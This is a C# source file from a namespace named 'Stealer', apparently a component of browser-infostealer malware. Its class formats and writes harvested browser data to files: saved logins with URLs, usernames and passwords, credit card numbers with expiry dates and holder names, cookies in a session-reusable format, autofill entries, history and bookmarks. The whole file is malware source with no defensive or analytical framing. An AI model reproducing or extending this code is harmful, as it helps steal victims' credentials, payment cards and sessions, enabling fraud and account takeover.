using System;
using System.IO;
using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace Stealer
{
    internal sealed class cBrowserUtils
    {
        private static string FormatPassword(Password pPassword)
        {
            return String.Format("Url: {0}\nUsername: {1}\nPassword: {2}\n\n", pPassword.sUrl, pPassword.sUsername, pPassword.sPassword);
        }
        private static string FormatCreditCard(CreditCard cCard)
        {
            return String.Format("Type: {0}\nNumber: {1}\nExp: {2}\nHolder: {3}\n\n", Banking.DetectCreditCardType(cCard.sNumber), cCard.sNumber, cCard.sExpMonth + "/" + cCard.sExpYear, cCard.sName);
        }
        private static string FormatCookie(Cookie cCookie)
        {
            return String.Format("{0}\tTRUE\t{1}\tFALSE\t{2}\t{3}\t{4}\r\n", cCookie.sHostKey, cCookie.sPath, cCookie.sExpiresUtc, cCookie.sName, cCookie.sValue);
        }
        private static string FormatAutoFill(AutoFill aFill)
        {
            return String.Format("{0}\t\n{1}\t\n\n", aFill.sName, aFill.sValue);
        }
        private static string FormatHistory(Site sSite)
        {
            return String.Format("### {0} ### ({1}) {2}\n", sSite.sTitle, sSite.sUrl, sSite.iCount);
        }
        private static string FormatBookmark(Bookmark bBookmark)
        {
            if (!string.IsNullOrEmpty(bBookmark.sUrl))
                return String.Format("### {0} ### ({1})\n", bBookmark.sTitle, bBookmark.sUrl);
            else
                return String.Format("### {0} ###\n", bBookmark.sTitle);
        }

        public static bool WriteCookies(List<Cookie> cCookies, string sFile)
        {
            try
            {
                foreach (Cookie cCookie in cCookies)
                    File.AppendAllText(sFile, FormatCookie(cCookie));

                return true;
            }
            catch { return false; }
        }

        public static bool WriteAutoFill(List<AutoFill> aFills, string sFile)
        {
            try
            {
                foreach (AutoFill aFill in aFills)
                    File.AppendAllText(sFile, FormatAutoFill(aFill));

                return true;
            }
            catch { return false; }
        }

        public static bool WriteHistory(List<Site> sHistory, string sFile)
        {
            try
            {
                foreach (Site sSite in sHistory)
                    File.AppendAllText(sFile, FormatHistory(sSite));

                return true;
            }
            catch { return false; }
        }

        public static bool WriteBookmarks(List<Bookmark> bBookmarks, string sFile)
        {
            try
            {
                foreach (Bookmark bBookmark in bBookmarks)
                    File.AppendAllText(sFile, FormatBookmark(bBookmark));

                return true;
            }
            catch { return false; }
        }

        public static bool WritePasswords(List<Password> pPasswords, string sFile)
        {
            try
            {
                foreach (Password pPassword in pPasswords)
                {

                    if (pPassword.sUsername == "" || pPassword.sPassword == "")
                        continue;
                    File.AppendAllText(sFile, FormatPassword(pPassword));
                }

                return true;
            }
            catch { return false; }
        }

        public static bool WriteCreditCards(List<CreditCard> cCC, string sFile)
        {
            try
            {
                foreach (CreditCard aCC in cCC)
                    File.AppendAllText(sFile, FormatCreditCard(aCC));

                return true;
            }
            catch { return false; }
        }
    }
}

